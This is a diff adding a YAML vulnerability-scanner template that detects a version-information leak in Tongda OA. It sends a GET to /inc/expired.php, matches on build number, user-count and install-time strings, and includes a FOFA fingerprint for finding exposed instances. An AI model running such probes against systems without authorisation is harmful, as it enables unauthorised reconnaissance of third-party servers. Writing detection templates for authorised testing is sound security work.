@@ -1,0 +1,24 @@
+id: poc-yaml-tongda-expired-info-leak
+info:
+  name: 通达OA expired.php版本信息泄露
+  severity: low
+  tags:
+  - 信息泄露
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /inc/expired.php
+  expression: 'status_code == 200 && (
+
+    contains(gbk_decode(body),`内部版本号`) || contains(body,`内部版本号`) ) && (
+
+    contains(gbk_decode(body),`版权所有`) || contains(body,`版权所有`) ) && (
+
+    contains(gbk_decode(body),`OA用户数`) || contains(body,`OA用户数`) ) && (
+
+    contains(gbk_decode(body),`安装时间`) || contains(body,`安装时间`) )
+
+    '
+variables: {}
+transport: http
